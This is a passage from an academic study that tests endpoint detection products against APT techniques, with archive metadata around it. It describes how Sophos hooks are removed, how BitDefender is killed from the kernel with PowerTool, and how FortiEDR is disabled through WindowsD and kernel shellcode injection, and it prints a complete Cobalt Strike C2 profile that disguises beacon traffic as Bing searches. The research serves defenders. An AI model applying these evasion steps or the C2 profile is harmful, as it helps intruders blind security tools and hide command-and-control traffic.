hooks are still in place. Therefore, tools like Shellycoat of\n`AQUARMOURY and the Unhook-BOF` [21] for Cobalt Strike may remove them for a specific process or\nthe beacon’s current process, see Figure 56.\n\n#### Figure 56: Sophos’s usermode API hooks.\n\n### 5.3 Attacking BitDefender\n\nIn this case we opted to use a ”legitimate tool” to issue process termination from the kernel and\nsuccessfully kill all BitDefender related processes which resulted into the product shutting down\n\n21https://github.com/rsmudge/unhook-bof\n\n\n-----\n\nwithout any alert on the console. To this end, we used PowerTool[22] is a free anti-virus and rootkit\nutility. It offers the ability to detect, analyze, and fix various kernel structure modifications and\nallows a wide scope of the kernel. Using PowerTool, one can easily spot and remove malware hidden\nfrom normal software. The concept in this case was to use a defence related tool with a signed\ndriver[23] to leverage the kernel to kill the protection mechanisms[24]. To verify the results we executed\nmimikatz, see Figures 57 and 58. Bear in mind that tampering with the kernel may cause some\ninstabilities, meaning that this tool may trigger a blue screen of death situation.\n\n#### Figure 57: Running mimikatz after killing BitDefender with PowerTool.\n\nAs for the internal working of the driver, the technique used is rather common. It uses the\n```\n  ZwTerminateProcess() API to kill the process combined with several other APIs to access the\n\n```\nprocess of interest. Perhaps the most important one in this case is KeStackAttachProcess(), see\nFigure 59, which will attach to the address space of the target process prior to terminating. It should\nbe highlighted that similar methods have been used by APTs in the wild[25].\n\n### 5.4 Attacking FortiEDR\n\nDuring our experiments we noticed a behaviour that could be leveraged to attack FortiEDR. More\nprecisely, we noticed that while FortiEDR managed to block a malicious kernel exploit [26], namely\nWindowsD[27],it did not do it instantly. This allowed for a window of opportunity, wide enough to\ndisable DSE, see Figure 60. WindowsD is a 3rd party ”jailbreak” so administrators can remove some\nintrusive defensive features introduced in modern windows versions. Currently, it can disable:\n\n    - Driver signing, including WHQL-only locked systems (secureboot tablets).\n\n    - Protected processes (used for DRM, ”WinTcb”).\n\n    - Read-only, ”invulnerable” registry keys some software and even windows itself employs.\n\nIts main purpose is to exploit a signed, legitimate but vulnerable driver in order to access the\nkernel level and perform the ”jailbreaking” from the ring-0. In our case we will install the tool which\nwill disable DSE and then create a service for an unsigned driver.\nAlthough an alert was triggered and the attack was finally blocked according to the EDR report,\nWindowsD was successfully executed. This allowed us to disable FortiEDR by injecting into its\nprocesses from the kernel mode and intentionally causing them to become dysfunctional.Using the\n\n22https://code.google.com/archive/p/powertool-google/\n23https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-kestackattachprocess\n24http://www.rohitab.com/discuss/topic/40788-2-ways-to-terminate-a-process-from-kernel-mode/\n25https://news.sophos.com/en-us/2021/05/11/a-defenders-view-inside-a-darkside-ransomware-attack/\n26http://kat.lua.cz/posts/Some_fun_with_vintage_bugs_and_driver_signing_enforcement/#more\n27https://github.com/katlogic/WindowsD\n\n\n-----\n\n#### Figure 58: mimikatz successfully executed after killing BitDefender with PowerTool.\n\nKinject [28] driver we performed kernel mode shellcode injection using APCs.Then, after installing the\ndriver and injecting a calc shellcode file to all three processes, although the processes of FortiEDR\nseemed to remain running they were ”bricked”, see Figure 61.\n\n## 6 Conclusions\n\nThroughout this work, we went through a series of attack vectors used by advanced threat actors\nto infiltrate organisations. Using them, we evaluated state of the art EDR solutions to assess their\nreactions, as well as the produced telemetry. In this context, we provided an overview for each EDR\nand the measures used to detect and respond to an incident. Quite alarmingly, we illustrate that\nno EDR can efficiently detect and prevent the four attack vectors we deployed. In fact, the DLL\nsideloading attack is the most successful attack as most EDRs fail to detect, let alone blocking it.\nMoreover, we show that one may efficiently blind the EDRs by attacking their core which lies within\ntheir drivers at the kernel level. In future work, we plan to assess positive, false negative, false\npositive results produced by different EDRs to measure the noise that blue teams face in real-world\nscenarios. Moreover, the response time of EDRs will be measured as some EDRs may report attacks\nwith huge delays, even if they have mitigated them. These aspects may significantly impact the work\nof blue teams and have not received the needed coverage in the literature.\nBeyond Kaspersky’s hooking solution, vendors may opt for other approaches[29] with possible\nstability issues. However, most vendors prefer to use cloud sandboxes for analysis as this prevents\ncomputational overhead. It should be noted that attackers may use signed drivers and hypervisors,\ne.g. Kaspersky’s to launch their attacks and hook the kernel without issues in rootkits.\nUnfortunately, no solution can provide complete security for an organisation. Despite the significant advances in cybersecurity, an organisation needs to deploy a wide array of tools to remain\nsecure and not solely depend on one solution. Moreover, manual assessment of security logs and a\nholistic overview of the events are needed to prevent cyber attacks, especially APTs. Due to the\nnature of the latter, it is essential to stress the human factor [14, 16, 10], which in many cases is the\nweakest link in the security chain and is usually exploited to get initial access to an organisation.\nOrganisations must invest more in their blue teams so that they do not depend on the outputs of\na single tool and learn to respond to beyond a limited set of specific threats. This will boost their\ncapacity and raise the bar enough to prevent many threat actors from penetrating their systems.\nMoreover, by increasing their investments on user awareness campaigns and training regarding the\nmodus operandi of threat actors the organisation’s overall security will significantly increase. Fi\n28https://github.com/w1u0u1/kinject\n29https://github.com/rajiv2790/FalconEye\n\n\n-----\n\n#### Figure 59: Screenshot from IDA analysing the internal of the driver’s process termination.\n\nnally, the introduction of machine learning and AI in security is expected to improve the balance\nin favor of the blue teams in mitigating cyber attacks as significant steps have already been made\nby researchers. Advanced pattern recognition and correlation algorithms are finding their way in\nsecurity solutions, and EDRs in particular, detecting or even preventing many cyber attacks in their\nearly stages, decreasing their potential impact.\nThe tighter integration of machine learning and artificial intelligence in current EDRs must be\naccompanied with the use of explainability and interpretable frameworks. The latter may enable\nboth researchers and practitioners to understand the reasons behind false positives and facilitate in\nreducing them. Moreover, the potential use of this information as digital evidence with a proper\nargumentation in a court of law will lead more researchers into devoting more efforts in this aspect\nin the near future. Finally, the efficient collection of malicious artefacts is a challenge as beyond the\nveracity of the data that have to be processed, their volume and velocity imply further constraints\n\n\n-----\n\n#### Figure 60: Window of opportunity for attacking FortiEDR.\n\n Figure 61: ”Bricking” the processes of FortiEDR.\n\nfor the monitoring mechanisms. The security mechanisms not only have to be timely applied, but\nthey also have to be made in a seamless way so that they do not hinder the running applications\nand services. Therefore, researchers have to find better sampling and feature extraction methods\nto equip EDRs to allow them to collect the necessary input without hindering the availability and\noperations of the monitored systems.\n\n## Acknowledgement\n\nG. Karantzas dedicates this work in loving memory of Vasilis Alivizatos (1938-2021).\nThis work was supported by the European Commission under the Horizon 2020 Programme\n(H2020), as part of the projects CyberSec4Europe (https://www.cybersec4europe.eu) (Grant\nAgreement no. 830929) and LOCARD (https://locard.eu) (Grant Agreement no. 832735).\nThe content of this article does not reflect the official opinion of the European Union. Responsibility for the information and views expressed therein lies entirely with the authors.\n\n\n-----\n\n## Cobalt Strike malleable C2 profile\n\n#### Listing 6: Cobalt Strike malleable C2 profile.\n\n1 `https-certificate {`\n\n2 `set keystore \"a-banking.com.store\";`\n\n3 `set password \"REDACTED\";`\n\n4 `}`\n\n5 `set sleeptime \"2100\";`\n\n6 `set jitter` `\"10\";`\n\n7 `set maxdns` `\"242\";`\n\n8 `set useragent \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)\";`\n\n9 `set dns_idle \"8.8.4.4\";`\n\n10 `http-get {`\n\n11 `set uri \"/search/\";`\n\n12 `client {`\n\n13 `header \"Host\" \"www.a-banking.com\";`\n\n14 `header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";`\n\n15 `header \"Cookie\" \"DUP=Q=sSVBQtOPvz67FQGHOSGQUVE&Q=821357393&A=6&CV\";`\n\n16 `metadata {`\n\n17 `base64url;`\n\n18 `parameter \"q\";`\n\n19 `}`\n\n20 `parameter \"go\" \"Search\";`\n\n21 `parameter \"qs\" \"bs\";`\n\n22 `parameter \"form\" \"QBRE\";`\n\n23 `}`\n\n24 `server {`\n\n25 `header \"Cache-Control\" \"private, max-age=0\";`\n\n26 `header \"Content-Type\" \"text/html; charset=utf-8\";`\n\n27 `header \"Vary\" \"Accept-Encoding\";`\n\n28 `header \"Server\" \"Microsoft-IIS/8.5\";`\n\n29 `header \"Connection\" \"close\";`\n\n30 `output {`\n\n31 `netbios;`\n\n32 `prepend \"<!DOCTYPE html><html lang=\\\"en\\\" xml:lang=\\\"en\\\"`\n_�→_ `xmlns=\\\"http://www.w3.org/1999/xhtml\\\" xmlns:Web=\\\"http://schemas.`\n\n33 `live.com/Web`\n\n34 `/\\\"><script type=\\\"text/javascript\\\">//<![CDATA[si_ST=new`\n\n_�→_ `Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\\\"text/html; charset=utf-8\\\"`\n\n_�→_ `http-equiv=\\\"content-type\\\" /><link`\n\n_�→_ `href=\\\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\"`\n\n_�→_ `title=\\\"XML\\\" type=\\\"text/xml\\\" /><link`\n\n_�→_ `href=\\\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\"`\n\n_�→_ `title=\\\"RSS\\\" type=\\\"application/rss+xml\\\" /><link href=\\\"/sa/simg/bing_p_rr_teal_min.ico\\\"`\n\n_�→_ `rel=\\\"shortcut icon\\\" /><script type=\\\"text/javascript\\\">//<![CDATA[\";`\n\n\n35 `append \"G={ST:(si_ST?si_ST:new`\n\n_�→_ `Date),Mkt:\\\"en-US\\\",RTL:false,Ver:\\\"53\\\",IG:\\\"RcAjyxgJIzSo1gxEx2lLx5FGE36hjuXg\\\",EventID:\\\"fhqcX9i`\n\n_�→_ `}; _G.lsUrl=\\\"/fd/ls/l?IG=\\\"+_G.IG ;curUrl=\\\"http://www.`\n\n36 `bing.com/search\\\";function si_T(a){ if(document.images){_G.GPImg=new`\n\n_�→_ `Image;_G.GPImg.src=_G.gpUrl+\\\"IG=\\\"+_G.IG+\\\"&\\\"+a;}return true;};//]]></script><style`\n\n_�→_ `type=\\\"text/css\\\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_play`\n\n37 `after,.sw_st2:after,.sw_plus:`\n_�→_ `after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_`\n\n38 `after,.sw_calc:after,.sw_fbi:after,\";`\n\n39 `print;`\n\n40 `}`\n\n41 `}`\n\n42 `}`\n\n43 `http-post {`\n\n\n-----\n\n44 `set uri \"/Search/\";`\n\n45 `set verb \"GET\";`\n\n46 `client {`\n\n47 `header \"Host\" \"www.a-banking.com\";`\n\n48 `header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";`\n\n49 `header \"Cookie\" \"DUP=Q=H87cos1opc7Klawe6Lc8jR9&K=733873714&A=5&LE\";`\n\n50 `output {`\n\n51 `base64url;`\n\n52 `parameter \"q\";`\n\n53 `}`\n\n54 `parameter \"go\" \"Search\";`\n\n55 `parameter \"qs\" \"bs\";`\n\n56 `id {`\n\n57 `base64url;`\n\n58 `parameter \"form\";`\n\n59 `}`\n\n60 `}`\n\n61 `server {`\n\n62 `header \"Cache-Control\" \"private, max-age=0\";`\n\n63 `header \"Content-Type\" \"text/html; charset=utf-8\";`\n\n64 `header \"Vary\" \"Accept-Encoding\";`\n\n65 `header \"Server\" \"Microsoft-IIS/8.5\";`\n\n66 `header \"Connection\" \"close\";`\n\n67 `output {`\n\n68 `netbios;`\n\n69 `prepend \"<!DOCTYPE html><html lang=\\\"en\\\" xml:lang=\\\"en\\\" xmlns=\\\"`\n\n70 `http://www.w3.org/1999/xhtml\\\" xmlns:`\n\n71 `Web=\\\"`\n\n72 `http://schemas.live.com/Web/\\\">`\n\n73 `<script type=\\\"text/javascript\\\">//<![CDATA[si_ST=new`\n_�→_ `Date;//]]></script><head><!--pc--><title>`\n\n74 `Bing</title><meta content=\\\"text/html; charset=utf-8\\\" http-equiv=\\\"content-type\\\"`\n_�→_ `/><link href=\\\"/search?format=rss&amp;q=canary&amp;`\n\n75 `go=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\" title=\\\"XML\\\"`\n_�→_ `type=\\\"text/xml\\\" /><link href=\\\"/search?format=rss&amp;q=canary&amp;`\n\n76 `go=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\" title=\\\"RSS\\\"`\n_�→_ `type=\\\"application/rss+xml\\\" /><link href=\\\"/sa/simg/bing_p_rr_teal_min.ico\\\"`\n\n77 `rel=\\\"shortcut icon\\\" /><script type=\\\"text/javascript\\\">//<![CDATA[\";`\n\n78 `append \"G={ST:(si_ST?si_ST:new`\n\n_�→_ `Date),Mkt:\\\"en-US\\\",RTL:false,Ver:\\\"53\\\",IG:\\\"Ekf15rVExpRhlduPXXHkQDisEd1YRD1A\\\",`\n\n_�→_ `EventID:\\\"YXSxDqQzK1KnqZVSVLLiQVqtwtRGMVE9\\\",MN:\\\"SERP\\\",V:\\\"web\\\",P:\\\"SERP\\\",DA:\\\"CO4\\\",SUIH:\\\"OB`\n\n\n79 `,gpUrl:\\\"/fd/ls/GLinkPing.aspx?\\\" }; _G.lsUrl=\\\"`\n\n80 `/fd/ls/l?IG=\\\"+_G.IG ;curUrl=\\\"http://www.bing.com/search\\\";function si_T(a){`\n\n_�→_ `if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\\\"IG=\\\"+_G.IG+\\\"&\\\"+a;}return`\n\n_�→_ `true;};//]]></script><style`\n\n_�→_ `type=\\\"text/css\\\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_play`\n\n\n81 `print;`\n\n82 `}`\n\n83 `}`\n\n84 `}`\n\n85 `http-stager {`\n\n86 `server {`\n\n87 `header \"Cache-Control\" \"private, max-age=0\";`\n\n88 `header \"Content-Type\" \"text/html; charset=utf-8\";`\n\n89 `header \"Vary\" \"Accept-Encoding\";`\n\n90 `header \"Server\" \"Microsoft-IIS/8.5\";`\n\n91 `header \"Connection\" \"close\";`\n\n92 `}`\n\n93 `}`\n\n\n-----\n\n## References\n\n[1] Adel Alshamrani, Sowmya Myneni, Ankur Chowdhary, and Dijiang Huang. A survey on advanced persistent threats: Techniques, solutions, challenges, and research opportunities. IEEE\n_Communications Surveys & Tutorials, 21(2):1851–1877, 2019._\n\n[2] Theodoros Apostolopoulos, Vasilios Katos, Kim-Kwang Raymond Choo, and Constantinos Patsakis. Resurrecting anti-virtualization and anti-debugging: Unhooking your hooks. _Future_\n_Generation Computer Systems, 116:393–405, 2021._\n\n[3] Guillaume Brogi and Val´erie Viet Triem Tong. Terminaptor: Highlighting advanced persistent\nthreats through information flow tracking. In 2016 8th IFIP International Conference on New\n_Technologies, Mobility and Security (NTMS), pages 1–5. IEEE, 2016._\n\n[4] Christopher Campbell, Matt Graeber, Philip Goh, and Jimmy Bayne. Living off the land\nbinaries and scripts. https://lolbas-project.github.io/, 2020.\n\n[5] Mike Campfield. The problem with (most) network detection and response. Network Security,\n2020(9):6–9, 2020.\n\n[6] Ping Chen, Lieven Desmet, and Christophe Huygens. A study on advanced persistent threats.\nIn IFIP International Conference on Communications and Multimedia Security, pages 63–72.\nSpringer, 2014.\n\n[7] Anton Chuvakin. Named: Endpoint threat detection & response. https://blogs.gartner.\n```\n  com/anton-chuvakin/2013/07/26/named-endpoint-threat-detection-response/, 2013.\n\n```\n[8] Cornelis de Plaa. Red team tactics: Combining direct system calls and srdi to\nbypass av/edr. `https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-`\n```\n  direct-system-calls-and-srdi-to-bypass-av-edr/, 2019.\n\n```\n[9] World Economic Forum. Wild wide web consequences of digital fragmentation. `https://`\n```\n  reports.weforum.org/global-risks-report-2020/wild-wide-web/, 2020.\n\n```\n[10] Ibrahim Ghafir, Jibran Saleem, Mohammad Hammoudeh, Hanan Faour, Vaclav Prenosil, Sardar\nJaf, Sohail Jabbar, and Thar Baker. Security threats to critical infrastructure: the human factor.\n_The Journal of Supercomputing, 74(10):4986–5002, 2018._\n\n[11] Paul Giura and Wei Wang. A context-based detection framework for advanced persistent threats.\nIn 2012 International Conference on Cyber Security, pages 69–74, 2012.\n\n[12] Wajih Ul Hassan, Adam Bates, and Daniel Marino. Tactical provenance analysis for endpoint\ndetection and response systems. In 2020 IEEE Symposium on Security and Privacy (SP), pages\n1172–1189. IEEE, 2020.\n\n[13] Eric M Hutchins, Michael J Cloppert, Rohan M Amin, et al. Intelligence-driven computer\nnetwork defense informed by analysis of adversary campaigns and intrusion kill chains. Leading\n_Issues in Information Warfare & Security Research, 1(1):80, 2011._\n\n[14] Xin Luo, Richard Brody, Alessandro Seazzu, and Stephen Burd. Social engineering: The neglected human factor for information security management. Information Resources Management\n_Journal (IRMJ), 24(3):1–8, 2011._\n\n[15] Steve Mansfield-Devine. Fileless attacks: compromising targets without malware. _Network_\n_Security, 2017(4):7–11, 2017._\n\n[16] Efthymia Metalidou, Catherine Marinagi, Panagiotis Trivellas, Niclas Eberhagen, Christos Skourlas, and Georgios Giannakopoulos. The human factor of information security: Unintentional\ndamage perspective. Procedia-Social and Behavioral Sciences, 147:424–428, 2014.\n\n[17] Microsoft. Memory-mapped files. https://docs.microsoft.com/en-us/dotnet/standard/io/\n```\n  memory-mapped-files, 2017.\n\n```\n[18] Jon Oltsik. 2017: Security operations challenges, priorities, and strategies. `http://pages.`\n```\n  siemplify.co/rs/182-SXA-457/images/ESG-Research-Report.pdf, 2017.\n\n```\n[19] Charlie Osborne. Hackers exploit windows error reporting service in new fileless attack. https://www.zdnet.com/article/hackers-exploit-windows-error-reporting```\n  service-in-new-fileless-attack/, 2020.\n\n```\n[20] Aditya K Sood and Richard J. Enbody. Targeted cyberattacks: A superset of advanced persistent threats. IEEE Security Privacy, 11(1):54–61, 2013.\n\n[21] Blake E Strom, Andy Applebaum, Doug P Miller, Kathryn C Nickels, Adam G Pennington,\nand Cody B Thomas. Mitre att&ck: Design and philosophy. Technical report, 2018.\n\n[22] Symantec Enterprise. Threat landscape trends – q3 2020. `https://symantec-enterprise-`\n```\n  blogs.security.com/blogs/threat-intelligence/threat-landscape-trends-q3-2020,\n\n```\n2020.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/AV Tech/An Empirical Assessment of Endpoint Security Systems Against Advanced Persistent Threats Attack Vectors.pdf"
    ],
    "report_names": [
        "An Empirical Assessment of Endpoint Security Systems Against Advanced Persistent Threats Attack Vectors.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536175,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1629704910,
    "ts_modification_date": 1629704910,
    "files": {
        "pdf": "https://archive.orkl.eu/293de6dba6632200ae261d4aea4f88762ec0d9d5.pdf",
        "text": "https://archive.orkl.eu/293de6dba6632200ae261d4aea4f88762ec0d9d5.txt",
        "img": "https://archive.orkl.eu/293de6dba6632200ae261d4aea4f88762ec0d9d5.jpg"
    }
}